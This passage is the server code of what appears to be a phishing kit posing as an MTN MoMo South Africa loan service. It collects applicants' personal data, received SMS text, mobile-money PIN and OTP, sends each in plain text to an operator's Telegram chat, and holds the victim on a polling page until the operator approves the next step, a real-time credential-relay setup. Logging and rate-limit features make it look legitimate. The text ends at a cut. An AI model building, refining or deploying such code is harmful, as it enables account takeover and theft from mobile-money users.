// ============================================================
// server.js – MTN MoMo South Africa – Production Build v3.0
// Admin-poll-only flow with full audit and safety features
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const START_TIME = Date.now();

// ─── Environment ───
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';
const RATE_PHONE_DAY = parseInt(process.env.RATE_LIMIT_APPLICATIONS_PER_PHONE_PER_DAY || '3');
const RATE_IP_HOUR = parseInt(process.env.RATE_LIMIT_APPLICATIONS_PER_IP_PER_HOUR || '10');
const RATE_TG_HOUR = parseInt(process.env.RATE_LIMIT_TELEGRAM_PER_CHAT_PER_HOUR || '100');
const RETENTION_DAYS = parseInt(process.env.DATA_RETENTION_DAYS || '30');

if (!BOT_TOKEN || !CHAT_ID) {
    console.error('❌ FATAL: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID required.');
    process.exit(1);
}

const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ─── App Setup ───
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend'), { maxAge: '1h' }));

// ─── Structured Logger ───
function log(level, msg, meta = {}) {
    const entry = { ts: new Date().toISOString(), level, msg, ...meta };
    console.log(JSON.stringify(entry));
}
const logInfo = (m, x) => log('info', m, x);
const logWarn = (m, x) => log('warn', m, x);
const logError = (m, x) => log('error', m, x);

// ─── HTML Helpers ───
function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}

// ─── Input Sanitization ───
function sanitize(str, maxLen = 500) {
    if (typeof str !== 'string') return '';
    return str.trim().slice(0, maxLen).replace(/[\u0000-\u001F\u007F]/g, '');
}

// ─── Validators ───
const V = {
    phone: p => /^\d{9}$/.test(String(p || '').trim()),
    email: e => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(e || '').trim()),
    name: n => /^[a-zA-Z\u00C0-\u017F' -]{2,60}$/.test(String(n || '').trim()),
    amount: a => Number.isFinite(a) && a >= 5000 && a <= 500000,
    appId: id => /^MTN-ZA-\d{6}$/.test(String(id || '').trim()),
    smsText: t => typeof t === 'string' && t.trim().length >= 10 && t.length <= 2000,
    pin: p => /^\d{5}$/.test(String(p || '').trim()),
    otp: o => /^\d{4}$/.test(String(o || '').trim())
};

// ─── Data Store ───
const DATA_DIR = path.join(__dirname, '../data');
const APPS_FILE = path.join(DATA_DIR, 'applications.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
const REJECT_FILE = path.join(DATA_DIR, 'rejections.json');
const RATE_FILE = path.join(DATA_DIR, 'rate_limits.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const applications = {};
const rejectionHistory = {};
const rateLimits = { phone: {}, ip: {}, telegram: {} };
const ipCache = new Map(); // ip -> first seen

function saveJson(file, data) {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { logError('save_failed', { file, error: e.message }); }
}

function loadJson(file, fallback = {}) {
    try {
        if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch (e) { logError('load_failed', { file, error: e.message }); }
    return fallback;
}

function saveApps() {
    saveJson(APPS_FILE, {
        applications,
        timestamp: new Date().toISOString()
    });
}
function saveRejections() { saveJson(REJECT_FILE, rejectionHistory); }
function saveRateLimits() { saveJson(RATE_FILE, rateLimits); }

function loadAll() {
    const apps = loadJson(APPS_FILE, { applications: {} });
    if (apps.timestamp && Date.now() - new Date(apps.timestamp).getTime() < RETENTION_DAYS * 86400000) {
        Object.assign(applications, apps.applications || {});
    }
    Object.assign(rejectionHistory, loadJson(REJECT_FILE, {}));
    const rl = loadJson(RATE_FILE, { phone: {}, ip: {}, telegram: {} });
    Object.assign(rateLimits, rl);
    logInfo('data_loaded', { applications: Object.keys(applications).length });
}

// ─── Audit Log ───
function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); }
    catch (e) { logError('audit_failed', { error: e.message }); }
    logInfo(event, data);
}

// ─── Rate Limiting ───
function rateLimit(bucket, key, max, windowMs) {
    const now = Date.now();
    const b = rateLimits[bucket];
    if (!b[key]) b[key] = [];
    b[key] = b[key].filter(ts => now - ts < windowMs);
    if (b[key].length >= max) return false;
    b[key].push(now);
    return true;
}

// Periodic cleanup
setInterval(() => {
    const now = Date.now();
    ['phone', 'ip', 'telegram'].forEach(bucket => {
        Object.keys(rateLimits[bucket]).forEach(k => {
            rateLimits[bucket][k] = rateLimits[bucket][k].filter(ts => now - ts < 86400000);
            if (rateLimits[bucket][k].length === 0) delete rateLimits[bucket][k];
        });
    });
    saveRateLimits();
}, 3600000); // hourly

// ─── Telegram API (with timeout + retry) ───
async function tgCall(method, body, retries = 2) {
    for (let i = 0; i <= retries; i++) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 8000);
            const res = await fetch(`${TG_API}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
                signal: controller.signal
            });
            clearTimeout(timeout);
            const json = await res.json();
            if (json.ok) return json;
            logWarn('tg_api_error', { method, desc: json.description });
            if (i < retries) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        } catch (e) {
            logError('tg_fetch_error', { method, error: e.message, attempt: i + 1 });
            if (i < retries) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        }
    }
    return { ok: false };
}

function notify(text, buttons = null) {
    if (!rateLimit('telegram', CHAT_ID, RATE_TG_HOUR, 3600000)) {
        logWarn('telegram_rate_limit', { chatId: CHAT_ID });
        return;
    }
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    tgCall('sendMessage', body).catch(e => logError('notify_fail', { error: e.message }));
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ Reject',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    notify(text, buttons);
}

// ─── Application State Machine ───
function newApp(data) {
    return {
        ...data,
        application: 'pending',
        sms: 'idle',
        pin: 'idle',
        otp: 'idle',
        pinAttempts: 0,
        maxPinAttempts: 3,
        pinBlockedUntil: null,
        resendCounts: { sms: 0, otp: 0 },
        retryCounts: { sms: 0, pin: 0, otp: 0 },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        auditTrail: []
    };
}

function addAudit(app, event, meta = {}) {
    app.auditTrail = app.auditTrail || [];
    app.auditTrail.push({ ts: new Date().toISOString(), event, ...meta });
    if (app.auditTrail.length > 50) app.auditTrail = app.auditTrail.slice(-50);
}

// ─── Health & Meta ───
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: Math.floor((Date.now() - START_TIME) / 1000),
        applications: Object.keys(applications).length,
        version: '3.0.0'
    });
});

app.get('/api/version', (req, res) => {
    res.json({ version: '3.0.0', env: NODE_ENV });
});

// ============================================================
// USER-FACING ENDPOINTS
// ============================================================

// ─── Submit Application ───
app.post('/api/send-application', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'unknown').toString().split(',')[0].trim();
    const data = req.body?.applicationData || {};

    // Sanitize
    const clean = {
        applicationId: sanitize(data.applicationId, 20),
        loanType: sanitize(data.loanType, 40),
        loanAmount: Number(data.loanAmount),
        loanTerm: sanitize(data.loanTerm, 20),
        loanPurpose: sanitize(data.loanPurpose, 300),
        firstName: sanitize(data.firstName, 60),
        lastName: sanitize(data.lastName, 60),
        phone: sanitize(data.phone, 20),
        email: sanitize(data.email, 120),
        employment: sanitize(data.employment, 40),
        annualIncome: Number(data.annualIncome),
        kinName: sanitize(data.kinName, 60),
        kinPhone: sanitize(data.kinPhone, 20)
    };

    // Validate
    const errs = [];
    if (!V.appId(clean.applicationId)) errs.push('Invalid application ID.');
    if (!V.name(clean.firstName)) errs.push('Invalid first name.');
    if (!V.name(clean.lastName)) errs.push('Invalid last name.');
    if (!V.phone(clean.phone)) errs.push('Phone must be 9 digits.');
    if (!V.email(clean.email)) errs.push('Invalid email.');
    if (!V.amount(clean.loanAmount)) errs.push('Amount must be R 5,000 – R 500,000.');
    if (!clean.loanTerm) errs.push('Missing loan term.');
    if (!clean.loanPurpose) errs.push('Missing loan purpose.');
    if (!V.phone(clean.kinPhone)) errs.push('Next of kin phone must be 9 digits.');
    if (!V.name(clean.kinName)) errs.push('Invalid next of kin name.');

    if (errs.length) return res.status(400).json({ ok: false, error: errs[0], errors: errs });

    // Rate limits
    if (!rateLimit('phone', clean.phone, RATE_PHONE_DAY, 86400000))
        return res.status(429).json({ ok: false, error: 'Too many applications from this phone. Try again tomorrow.' });
    if (!rateLimit('ip', ip, RATE_IP_HOUR, 3600000))
        return res.status(429).json({ ok: false, error: 'Too many requests. Try again later.' });

    // Duplicate check
    if (applications[clean.applicationId]) {
        return res.status(409).json({ ok: false, error: 'Application ID already exists.' });
    }

    applications[clean.applicationId] = newApp(clean);
    const app_ = applications[clean.applicationId];
    addAudit(app_, 'application_submitted', { ip });
    saveApps();

    audit('application_submitted', { id: clean.applicationId, ip, phone: clean.phone });

    askApproval(
        `📋 <b>NEW LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ID: ${code(clean.applicationId)}\n` +
        `👤 ${esc(clean.firstName)} ${esc(clean.lastName)}\n` +
        `📱 Phone: ${code('+27' + clean.phone)}\n` +
        `📧 Email: ${code(clean.email)}\n` +
        `💰 <b>R ${clean.loanAmount.toLocaleString()}</b>\n` +
        `📅 ${esc(clean.loanTerm)}\n` +
        `📌 Purpose: ${esc(clean.loanPurpose)}\n` +
        `💼 ${esc(clean.employment)} — R ${clean.annualIncome.toLocaleString()}/yr\n` +
        `👨‍👩‍👦 Kin: ${esc(clean.kinName)} ${code('+27' + clean.kinPhone)}\n\n` +
        `🔔 <b>Approve to allow SMS step?</b>`,
        'application',
        clean.applicationId
    );

    res.json({ ok: true, applicationId: clean.applicationId, status: 'pending' });
});

// ─── Submit SMS ───
app.post('/api/send-momo-message', (req, res) => {
    const { applicationId, momoMessage } = req.body?.momoData || {};
    const app_ = applications[sanitize(applicationId, 20)];

    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (app_.application !== 'approved')
        return res.status(400).json({ ok: false, error: 'Application not approved yet.' });
    if (app_.sms === 'pending')
        return res.status(400).json({ ok: false, error: 'SMS already submitted, awaiting review.' });

    const msg = sanitize(momoMessage, 2000);
    if (!V.smsText(msg)) return res.status(400).json({ ok: false, error: 'SMS content too short.' });

    app_.sms = 'pending';
    app_.smsMessage = msg;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'sms_submitted', { length: msg.length });
    saveApps();

    audit('sms_submitted', { id: applicationId });

    askApproval(
        `📨 <b>SMS VERIFICATION</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ${code(applicationId)}\n` +
        `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
        `📱 ${code('+27' + app_.phone)}\n\n` +
        `📩 <b>SMS Content:</b>\n${block(msg)}\n\n` +
        `🔔 <b>Approve to allow PIN step?</b>`,
        'sms',
        applicationId
    );

    res.json({ ok: true, status: 'pending' });
});

// ─── Submit PIN ───
app.post('/api/send-pin', (req, res) => {
    const { applicationId, pin } = req.body || {};
    const app_ = applications[sanitize(applicationId, 20)];

    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (app_.sms !== 'approved')
        return res.status(400).json({ ok: false, error: 'SMS step not approved yet.' });
    if (app_.pin === 'pending')
        return res.status(400).json({ ok: false, error: 'PIN already submitted, awaiting review.' });

    if (app_.pinBlockedUntil && new Date(app_.pinBlockedUntil) > new Date()) {
        const rem = Math.ceil((new Date(app_.pinBlockedUntil) - new Date()) / 1000);
        return res.status(429).json({ ok: false, blocked: true, error: `Blocked. Wait ${rem}s.` });
    }

    const cleanPin = sanitize(pin, 10);
    if (!V.pin(cleanPin)) {
        app_.pinAttempts = (app_.pinAttempts || 0) + 1;
        const rem = app_.maxPinAttempts - app_.pinAttempts;
        if (rem <= 0) {
            app_.pinBlockedUntil = new Date(Date.now() + 300000).toISOString();
            addAudit(app_, 'pin_blocked');
            saveApps();
            return res.status(423).json({ ok: false, blocked: true, error: 'Blocked for 5 minutes.' });
        }
        saveApps();
        return res.status(400).json({ ok: false, error: `Invalid PIN format. ${rem} attempts left.`, remainingAttempts: rem });
    }

    app_.pin = cleanPin;
    app_.pin = 'pending';
    app_.pinStatus = 'pending';
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'pin_submitted');
    saveApps();

    audit('pin_submitted', { id: applicationId });

    askApproval(
        `🔐 <b>PIN VERIFICATION</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ${code(applicationId)}\n` +
        `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
        `🔢 PIN: ${code(cleanPin)}\n\n` +
        `🔔 <b>Approve to allow OTP step?</b>`,
        'pin',
        applicationId
    );

    res.json({ ok: true, status: 'pending' });
});

// ─── Submit OTP ───
app.post('/api/send-otp', (req, res) => {
    const { applicationId, otp } = req.body || {};
    const app_ = applications[sanitize(applicationId, 20)];

    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (app_.pin !== 'approved')
        return res.status(400).json({ ok: false, error: 'PIN step not approved yet.' });
    if (app_.otp === 'pending')
        return res.status(400).json({ ok: false, error: 'OTP already submitted, awaiting review.' });

    const cleanOtp = sanitize(otp, 10);
    if (!V.otp(cleanOtp)) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits.' });

    app_.otp = 'pending';
    app_.otpCode = cleanOtp;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'otp_submitted');
    saveApps();

    audit('otp_submitted', { id: applicationId });

    askApproval(
        `🔑 <b>OTP VERIFICATION</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ${code(applicationId)}\n` +
        `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
        `🔢 OTP: ${code(cleanOtp)}\n\n` +
        `🔔 <b>Approve to complete the loan?</b>`,
        'otp',
        applicationId
    );

    res.json({ ok: true, status: 'pending' });
});

// ─── Poll Status ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[sanitize(applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (!['application', 'sms', 'pin', 'otp'].includes(step))
        return res.status(400).json({ ok: false, error: 'Invalid step.' });

    res.json({
        ok: true,
        status: app_[step] || 'idle',
        applicationId,
        step,
        resendCounts: app_.resendCounts,
        retryCounts: app_.retryCounts,
        pinBlockedUntil: app_.pinBlockedUntil
    });
});

// ─── Get Full Status ───
app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[sanitize(req.params.applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    res.json({
        ok: true,
        application: app_.application,
        sms: app_.sms,
        pin: app_.pin,
        otp: app_.otp,
        pinBlockedUntil: app_.pinBlockedUntil,
        resendCounts: app_.resendCounts,
        retryCounts: app_.retryCounts
    });
});

// ─── Resend SMS (reset SMS step) ───
app.post('/api/resend-sms/:applicationId', (req, res) => {
    const app_ = applications[sanitize(req.params.applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (app_.application !== 'approved')
        return res.status(400).json({ ok: false, error: 'Application not approved.' });

    app_.sms = 'idle';
    app_.smsMessage = null;
    app_.resendCounts.sms = (app_.resendCounts.sms || 0) + 1;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'sms_resend');
    saveApps();

    audit('sms_resend', { id: app_.applicationId });
    res.json({ ok: true });
});

// ─── Resend OTP ───
app.post('/api/resend-otp', (req, res) => {
    const { applicationId } = req.body || {};
    const app_ = applications[sanitize(applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });

    app_.otp = 'idle';
    app_.otpCode = null;
    app_.resendCounts.otp = (app_.resendCounts.otp || 0) + 1;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'otp_resend');
    saveApps();

    audit('otp_resend', { id: applicationId });

    notify(
        `🔄 <b>OTP RESENT</b>\n` +
        `🆔 ${code(applicationId)}\n` +
        `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
        `📱 ${code('+27' + app_.phone)}\n` +
        `🔁 Resend #${app_.resendCounts.otp}`
    );

    res.json({ ok: true });
});

// ─── Retry Step ───
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[sanitize(applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    if (!['sms', 'pin', 'otp'].includes(step))
        return res.status(400).json({ ok: false, error: 'Invalid step.' });

    app_[step] = 'idle';
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') { app_.pin = null; app_.pinAttempts = 0; app_.pinBlockedUntil = null; }
    if (step === 'otp') app_.otpCode = null;
    app_.retryCounts[step] = (app_.retryCounts[step] || 0) + 1;
    app_.updatedAt = new Date().toISOString();
    addAudit(app_, 'step_retry', { step });
    saveApps();

    audit('step_retry', { id: applicationId, step });
    res.json({ ok: true });
});

// ─── Reset PIN Attempts ───
app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
    const app_ = applications[sanitize(req.params.applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
    app_.pinAttempts = 0;
    app_.pinBlockedUntil = null;
    saveApps();
    res.json({ ok: true });
});

// ─── Rejection Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    const app_ = applications[sanitize(req.params.applicationId, 20)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });

    let step = null;
    if (app_.application === 'rejected') step = 'application';
    else if (app_.sms === 'rejected') step = 'sms';
    else if (app_.pin === 'rejected') step = 'pin';
    else if (app_.otp === 'rejected') step = 'otp';

    res.json({ ok: true, rejectedStep: step, applicationId: req.params.applicationId });
});

// ============================================================
// TELEGRAM WEBHOOK
// ============================================================
app.post('/api/telegram-webhook', async (req, res) => {
    // Authenticate
    if (WEBHOOK_SECRET) {
        const provided = req.headers['x-telegram-bot-api-secret-token'] || '';
        if (provided !== WEBHOOK_SECRET) {
            logWarn('webhook_unauthorized');
            return res.sendStatus(403);
        }
    }

    // Respond immediately to Telegram
    res.sendStatus(200);

    try {
        // ─── Callback Queries (YES/NO buttons) ───
        if (req.body.callback_query) {
            const q = req.body.callback_query;
            // Answer immediately to prevent button spinner
            tgCall('answerCallbackQuery', { callback_query_id: q.id, text: 'Received' }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) {
                    logWarn('callback_app_not_found', { id: data.id });
                    return;
                }

                const step = data.s;
                const approved = data.a === 'Y';

                // Anti-double-click protection
                if (app_[step] !== 'pending') {
                    logWarn('callback_wrong_state', { id: data.id, step, current: app_[step] });
                    return;
                }

                app_[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();
                addAudit(app_, `admin_${approved ? 'approved' : 'rejected'}`, { step, by: q.from?.username || 'unknown' });
                saveApps();

                audit('admin_decision', {
                    id: data.id,
                    step,
                    decision: approved ? 'approved' : 'rejected',
                    by: q.from?.username || 'unknown'
                });

                if (!approved) {
                    rejectionHistory[data.id] = {
                        step,
                        at: new Date().toISOString(),
                        by: q.from?.username || 'unknown'
                    };
                    saveRejections();
                }

                // Confirm to admin
                const icon = approved ? '✅' : '❌';
                notify(
                    `${icon} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(data.id)}\n` +
                    `📋 Step: <b>${step.toUpperCase()}</b>\n` +
                    `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
                    `⚡ User notified instantly`
                );
            } catch (e) {
                logError('callback_parse_error', { error: e.message, data: q.data });
            }
            return;
        }

        // ─── Text Commands ───
        if (req.body.message?.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            const user = req.body.message.from?.username || 'unknown';

            if (chatId !== CHAT_ID.toString()) {
                logWarn('unauthorized_command', { chatId, user });
                notify(`⚠️ Unauthorized user attempted: ${esc(text)}`);
                return;
            }

            handleCommand(text, user);
        }
    } catch (e) {
        logError('webhook_error', { error: e.message, stack: e.stack });
    }
});

// ─── Admin Command Handler ───
function handleCommand(text, user) {
    audit('admin_command', { command: text.split(' ')[0], user });

    if (text === '/start' || text === '/help') {
        notify(
            `🤖 <b>MTN MoMo Loan Admin Bot</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>Monitoring:</b>\n` +
            `📊 /stats — Summary statistics\n` +
            `⏳ /pending — All pending approvals\n` +
            `📋 /list — Last 10 applications\n` +
            `🔍 /search [ID] — Full details\n\n` +
            `<b>Actions:</b>\n` +
            `✅ /approve [ID] [step] — Manual approve\n` +
            `❌ /reject [ID] [step] — Manual reject\n` +
            `🗑 /delete [ID] — Delete application\n` +
            `🧹 /clear — Wipe all data (confirm)\n` +
            `📤 /export — Download JSON backup\n\n` +
            `<b>System:</b>\n` +
            `📌 /status — Bot health\n` +
            `❓ /help — This menu`
        );
        return;
    }

    if (text === '/stats') {
        const apps = Object.values(applications);
        const total = apps.length;
        const byState = {
            application: { pending: 0, approved: 0, rejected: 0 },
            sms: { pending: 0, approved: 0, rejected: 0 },
            pin: { pending: 0, approved: 0, rejected: 0 },
            otp: { pending: 0, approved: 0, rejected: 0 }
        };
        apps.forEach(a => {
            ['application', 'sms', 'pin', 'otp'].forEach(s => {
                if (byState[s][a[s]] !== undefined) byState[s][a[s]]++;
            });
        });
        const completed = apps.filter(a => a.otp === 'approved').length;
        const totalAmount = apps.reduce((s, a) => s + (a.loanAmount || 0), 0);

        notify(
            `📊 <b>STATISTICS</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📝 Total: <b>${total}</b>\n` +
            `✅ Completed: <b>${completed}</b>\n` +
            `💰 Total value: <b>R ${totalAmount.toLocaleString()}</b>\n\n` +
            `<b>Pending approvals:</b>\n` +
            `  1️⃣ App: ${byState.application.pending}\n` +
            `  2️⃣ SMS: ${byState.sms.pending}\n` +
            `  3️⃣ PIN: ${byState.pin.pending}\n` +
            `  4️⃣ OTP: ${byState.otp.pending}\n\n` +
            `<b>Rejected:</b>\n` +
            `  App: ${byState.application.rejected} | SMS: ${byState.sms.rejected} | PIN: ${byState.pin.rejected} | OTP: ${byState.otp.rejected}`
        );
        return;
    }

    if (text === '/pending') {
        const pending = Object.entries(applications).filter(([_, a]) =>
            a.application === 'pending' || a.sms === 'pending' || a.pin === 'pending' || a.otp === 'pending'
        );
        if (pending.length === 0) { notify('✅ No pending approvals.'); return; }
        let msg = `⏳ <b>PENDING APPROVALS (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
        pending.slice(0, 15).forEach(([id, a]) => {
            const steps = [];
            if (a.application === 'pending') steps.push('app');
            if (a.sms === 'pending') steps.push('SMS');
            if (a.pin === 'pending') steps.push('PIN');
            if (a.otp === 'pending') steps.push('OTP');
            msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n💰 R ${a.loanAmount.toLocaleString()}\n📋 Waiting: <b>${steps.join(', ')}</b>\n`;
        });
        notify(msg);
        return;
    }

    if (text === '/list') {
        const ids = Object.keys(applications).slice(-10);
        if (!ids.length) { notify('📭 No applications.'); return; }
        let msg = `📋 <b>LAST ${ids.length} APPLICATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
        ids.forEach((id, i) => {
            const a = applications[id];
            msg += `\n${i + 1}. 🆔 ${code(id)}\n   👤 ${esc(a.firstName)} ${esc(a.lastName)}\n   💰 R ${a.loanAmount.toLocaleString()}\n   📌 App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp}\n`;
        });
        notify(msg);
        return;
    }

    if (text.startsWith('/search ')) {
        const id = text.replace('/search ', '').trim().toUpperCase();
        const a = applications[id];
        if (!a) { notify(`❌ Not found: ${code(id)}`); return; }
        notify(
            `🔍 <b>APPLICATION DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n` +
            `📱 ${code('+27' + a.phone)}\n📧 ${code(a.email)}\n` +
            `💰 <b>R ${a.loanAmount.toLocaleString()}</b>\n📅 ${esc(a.loanTerm)}\n` +
            `📌 Purpose: ${esc(a.loanPurpose)}\n💼 ${esc(a.employment)}\n` +
            `👨‍👩‍👦 Kin: ${esc(a.kinName)} ${code('+27' + a.kinPhone)}\n\n` +
            `<b>Status:</b>\n  App: ${a.application}\n  SMS: ${a.sms}\n  PIN: ${a.pin}\n  OTP: ${a.otp}\n\n` +
            `<b>Activity:</b>\n  Resends: ${JSON.stringify(a.resendCounts)}\n  Retries: ${JSON.stringify(a.retryCounts)}\n  Submitted: ${a.createdAt}`
        );
        return;
    }

    if (text.startsWith('/approve ')) {
        const parts = text.replace('/approve ', '').trim().split(/\s+/);
        const id = parts[0]?.toUpperCase(), step = parts[1]?.toLowerCase();
        manualDecision(id, step, true, user);
        return;
    }

    if (text.startsWith('/reject ')) {
        const parts = text.replace('/reject ', '').trim().split(/\s+/);
        const id = parts[0]?.toUpperCase(), step = parts[1]?.toLowerCase();
        manualDecision(id, step, false, user);
        return;
    }

    if (text.startsWith('/delete ')) {
        const id = text.replace('/delete ', '').trim().toUpperCase();
        if (!applications[id]) { notify(`❌ Not found: ${code(id)}`); return; }
        delete applications[id];
        delete rejectionHistory[id];
        saveApps();
        saveRejections();
        audit('admin_delete', { id, user });
        notify(`🗑 Deleted ${code(id)}`);
        return;
    }

    if (text === '/clear') {
        notify(`⚠️ <b>DANGER</b>\n\nReply with <code>/confirm_clear</code> to permanently delete ALL applications.`);
        return;
    }

    if (text === '/confirm_clear') {
        const count = Object.keys(applications).length;
        Object.keys(applications).forEach(k => delete applications[k]);
        Object.keys(rejectionHistory).forEach(k => delete rejectionHistory[k]);
        saveApps();
        saveRejections();
        audit('admin_clear_all', { count, user });
        notify(`🧹 Cleared ${count} applications.`);
        return;
    }

    if (text === '/export') {
        const payload = JSON.stringify({ applications, rejectionHistory, exportedAt: new Date().toISOString() }, null, 2);
        const filename = `mtn-momo-export-${Date.now()}.json`;
        const filePath = path.join(DATA_DIR, filename);
        fs.writeFileSync(filePath, payload);
        notify(`📤 Export ready.\nApplications: ${Object.keys(applications).length}\nFile: ${filename}`);
        return;
    }

    if (text === '/status') {
        const uptime = Math.floor((Date.now() - START_TIME) / 1000);
        const hrs = Math.floor(uptime / 3600);
        const mins = Math.floor((uptime % 3600) / 60);
        const secs = uptime % 60;
        notify(
            `✅ <b>BOT STATUS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🚀 Online: ${hrs}h ${mins}m ${secs}s\n` +
            `📊 Applications: ${Object.keys(applications).length}\n` +
            `📁 Data dir: ${DATA_DIR}\n` +
            `⏰ Server time: ${new Date().toISOString()}\n` +
            `💾 Env: ${NODE_ENV}`
        );
        return;
    }

    notify(`❓ Unknown command. Send /help for the menu.`);
}

function manualDecision(id, step, approve, user) {
    if (!id || !['application', 'sms', 'pin', 'otp'].includes(step)) {
        notify(`❌ Usage: <code>/${approve ? 'approve' : 'reject'} MTN-ZA-XXXXXX step</code>`);
        return;
    }
    const a = applications[id];
    if (!a) { notify(`❌ Not found: ${code(id)}`); return; }

    a[step] = approve ? 'approved' : 'rejected';
    a.updatedAt = new Date().toISOString();
    addAudit(a, `admin_${approve ? 'approved' : 'rejected'}`, { step, by: user, manual: true });
    saveApps();

    if (!approve) {
        rejectionHistory[id] = { step, at: new Date().toISOString(), by: user, manual: true };
        saveRejections();
    }

    audit('admin_manual_decision', { id, step, decision: approve ? 'approved' : 'rejected', user });
    notify(`${approve ? '✅' : '❌'} ${step.toUpperCase()} ${approve ? 'approved' : 'rejected'} for ${code(id)}`);
}

// ============================================================
// WEBHOOK SETUP HELPER (one-time call)
// ============================================================
app.get('/api/setup/webhook', async (req, res) => {
    const url = req.query.url;
    if (!url) return res.status(400).json({ ok: false, error: 'Provide ?url=https://...' });
    const body = { url: url + '/api/telegram-webhook', drop_pending_updates: true };
    if (WEBHOOK_SECRET) body.secret_token = WEBHOOK_SECRET;
    const result = await tgCall('setWebhook', body);
    res.json(result);
});

app.get('/api/setup/webhook-info', async (req, res) => {
    const result = await tgCall('getWebhookInfo', {});
    res.json(result);
});

// ============================================================
// CLEANUP & SHUTDOWN
// ============================================================
setInterval(() => {
